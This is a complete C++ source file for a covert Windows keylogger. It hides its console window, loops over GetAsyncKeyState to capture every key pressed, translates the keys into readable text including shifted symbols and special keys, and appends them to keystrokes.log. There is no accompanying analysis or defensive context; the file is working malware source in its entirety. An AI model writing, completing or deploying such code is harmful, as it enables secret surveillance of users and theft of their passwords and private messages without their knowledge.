#include <windows.h>
#include <fstream>
#include <string>
#include <map>
#include <vector>
#include <algorithm>

const std::string LOG_FILE = "keystrokes.log";

// Log key to file
void LogKey(const std::string& key) {
    std::ofstream file(LOG_FILE, std::ios::app);
    if (file.is_open()) {
        file << key;
        file.close();
    }
}

// Ultimate Key Translator
std::string TranslateKey(int vkCode) {
    // Non-printable keys (VK_SPACE, VK_RETURN, etc.)
    static const std::map<int, std::string> SPECIAL_KEYS = {
        {VK_SPACE, " "}, {VK_RETURN, "[ENTER]\n"}, {VK_TAB, "[TAB]"},
        {VK_BACK, "[BACKSPACE]"}, {VK_ESCAPE, "[ESC]"}, {VK_CAPITAL, "[CAPSLOCK]"},
        {VK_SHIFT, "[SHIFT]"}, {VK_CONTROL, "[CTRL]"}, {VK_MENU, "[ALT]"},
        {VK_LWIN, "[WIN]"}, {VK_RWIN, "[WIN]"}, {VK_APPS, "[MENU]"},
        {VK_INSERT, "[INS]"}, {VK_DELETE, "[DEL]"}, {VK_HOME, "[HOME]"},
        {VK_END, "[END]"}, {VK_PRIOR, "[PGUP]"}, {VK_NEXT, "[PGDN]"},
        {VK_LEFT, "[LEFT]"}, {VK_RIGHT, "[RIGHT]"}, {VK_UP, "[UP]"},
        {VK_DOWN, "[DOWN]"}, {VK_NUMLOCK, "[NUMLOCK]"}, {VK_SCROLL, "[SCROLLLOCK]"},
        {VK_SNAPSHOT, "[PRTSC]"}, {VK_PAUSE, "[PAUSE]"}, {VK_LBUTTON, "[LMB]"},
        {VK_RBUTTON, "[RMB]"}, {VK_MBUTTON, "[MMB]"}, {VK_XBUTTON1, "[XB1]"},
        {VK_XBUTTON2, "[XB2]"}, {VK_VOLUME_MUTE, "[VOL_MUTE]"}, {VK_VOLUME_DOWN, "[VOL_DOWN]"},
        {VK_VOLUME_UP, "[VOL_UP]"}, {VK_MEDIA_NEXT_TRACK, "[NEXT_TRACK]"}, {VK_MEDIA_PREV_TRACK, "[PREV_TRACK]"},
        {VK_MEDIA_STOP, "[MEDIA_STOP]"}, {VK_MEDIA_PLAY_PAUSE, "[PLAY_PAUSE]"}, {VK_LAUNCH_MAIL, "[MAIL]"},
        {VK_LAUNCH_MEDIA_SELECT, "[MEDIA_SEL]"}, {VK_LAUNCH_APP1, "[APP1]"}, {VK_LAUNCH_APP2, "[APP2]"}
    };

    // Check if it's a special key
    if (SPECIAL_KEYS.count(vkCode)) {
        return SPECIAL_KEYS.at(vkCode);
    }

    // Function keys (F1-F24)
    if (vkCode >= VK_F1 && vkCode <= VK_F24) {
        return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
    }

    // Numpad keys (0-9)
    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9) {
        return "[NUMPAD" + std::to_string(vkCode - VK_NUMPAD0) + "]";
    }

    // Get keyboard state for accurate symbol translation
    BYTE keyboardState[256] = {0};
    GetKeyboardState(keyboardState);

    // Handle Shift/CapsLock properly
    bool shiftPressed = (keyboardState[VK_SHIFT] & 0x80) != 0;
    bool capsLockOn = (keyboardState[VK_CAPITAL] & 0x01) != 0;

    // Translate to character (respecting keyboard layout)
    char buffer[2] = {0};
    int result = ToAscii(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC),
                        keyboardState, reinterpret_cast<LPWORD>(buffer), 0);

    if (result == 1) { // Successfully translated
        // Handle letters (A-Z)
        if (vkCode >= 'A' && vkCode <= 'Z') {
            if ((capsLockOn && !shiftPressed) || (!capsLockOn && shiftPressed)) {
                return std::string(1, buffer[0]); // Uppercase
            } else {
                return std::string(1, tolower(buffer[0])); // Lowercase
            }
        }

        // Handle numbers (0-9) and symbols (!@#$%^&* etc.)
        if (vkCode >= '0' && vkCode <= '9') {
            if (shiftPressed) {
                const char shiftedSymbols[] = ")!@#$%^&*(";
                return std::string(1, shiftedSymbols[vkCode - '0']);
            } else {
                return std::string(1, buffer[0]);
            }
        }

        // Default: Any other printable character (e.g., ;'[],./\`~)
        return std::string(1, buffer[0]);
    }

    // Fallback: Show raw key code if unknown
    return "[KEY:" + std::to_string(vkCode) + "]";
}

int main() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while (true) {
        Sleep(10); // Reduce CPU usage
        for (int vkCode = 8; vkCode <= 254; vkCode++) {
            if (GetAsyncKeyState(vkCode) & 0x0001) {
                LogKey(TranslateKey(vkCode));
            }
        }
    }
    return 0;
}
